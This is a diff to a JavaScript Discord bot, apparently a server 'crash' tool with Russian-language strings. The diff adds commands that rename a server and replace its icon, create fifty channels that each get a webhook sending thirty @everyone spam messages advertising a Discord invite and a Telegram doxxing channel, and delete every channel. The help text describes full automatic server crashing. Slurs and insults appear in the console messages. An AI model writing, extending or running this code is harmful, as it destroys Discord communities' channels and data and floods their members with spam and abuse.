@@ -27,7 +27,6 @@ const embed = new MessageEmbed()
         .setImage('https://media.discordapp.net/attachments/919097311064363009/952442718074839040/veJAJ6_9v1g.png')
 	.setColor('#ff0000');
 
-
 client.on('message', async (message) => {
   if (message.content === '~auto') {
   if (allowedusers.includes(message.author.id)) {
@@ -93,6 +92,48 @@ client.on('message', async (message) => {
 
 
 client.on('message', async (message) => {
+  if (message.content === '~rename') {
+  if (allowedusers.includes(message.author.id)) {
+    message.delete(); 
+    message.guild.setIcon("https://media.discordapp.net/attachments/919097311064363009/952442718074839040/veJAJ6_9v1g.png");
+    await message.guild.setName("××× Crashed by austr ×××");
+    } else {console.log('ваша мама шлюха')}
+};
+});
+
+
+
+client.on('message', async (message) => {
+  if (message.content === '~channels') {
+  if (allowedusers.includes(message.author.id)) {
+    message.delete(); 
+    for (let i = 1; i <= 50; i++) {
+        message.guild.channels
+          .create("crashed-by-austr-"+getRandomInt(1, 1000), {
+            type: "text",
+            topic: "https://discord.gg/lavanbot",
+          })
+          .then(channel => {
+              channel.createWebhook("×××Crashed by austr×××", { 
+				}).then(async webhook => {
+                  for (let i = 1; i <= 30; i++) { 
+                            webhook.send({
+	content: '@everyone @here данный сервер крашится. Переходите к нам если хотите также. У нас есть все, что вам нужною https://discord.gg/lavanbot https://t.me/russian_deanon',
+	username: '××× Crashed by Austr ×××',
+	avatarURL: 'https://media.discordapp.net/attachments/919097311064363009/952442718074839040/veJAJ6_9v1g.png',
+	embeds: [embed],
+});      
+                  };
+              });
+          });
+      } 1000;
+    } else {console.log('ваша мама шлюха')}
+};
+});
+
+
+
+client.on('message', async (message) => {
   if (message.content === '~createhooks') {
   if (allowedusers.includes(message.author.id)) {
     message.delete(); 
@@ -123,7 +164,22 @@ client.on('message', async (message) => {
 
 
 client.on('message', async (message) => {
-  if (message.content === '~renamechannels') {
+  if (message.content === '~delchannels') {
+  if (allowedusers.includes(message.author.id)) {
+    message.delete(); 
+    try {
+     message.guild.channels.cache.forEach 
+     (channel => channel.delete()); 
+     } catch { 
+        console.log("Негр ошибка");
+        } 
+    } else {console.log('ваша мама шлюха')}
+};
+});
+
+
+client.on('message', async (message) => {
+  if (message.content === '~renchannels') {
   if (allowedusers.includes(message.author.id)) {
     message.delete(); 
     try {
@@ -146,12 +202,14 @@ client.on('message', message => {
     } else {console.log('ваша мама шлюха')}
 });
 
+
+
 client.on('message', (msg) => {
   if (msg.content === '~help') {
   if (allowedusers.includes(msg.author.id)) {
     msg.delete();
     let now = Date.now()
-    msg.channel.send('`~auto` - **полный автоматический краш сервера**\n`~nuke` - **удаление всех каналов и ролей**\n`~ping` - **показывает задержку селф бота**\n`~renamechannels` - **обходит анти-краш ботов**\n`~roles` - **создание ролей**\n`~hookall` - **спам во все каналы вебюхуками**\n`~createhooks` - **создание вебхуков везде**')
+    msg.channel.send('```~auto - автоматический краш сервера\n~nuke - удаление всех каналов и ролей\n~ping - пинг селф бота\n~renchannels - переименование каналов\n~delchannels - удаление каналов\n~roles - создание ролей\n~channels - создание каналов\n~createhooks - создание вебхуков везде\n~hookall - спам хуками во все каналы\n~rename - изменение иконки и имени сервера```')
   }
     } else {console.log('ваша мама шлюха')}
 })
@@ -177,6 +235,7 @@ client.on('message', (msg) => {
   }
     } else {console.log('ваша мама шлюха')}
 })
+
 
 keepAlive();
 client.login(token);
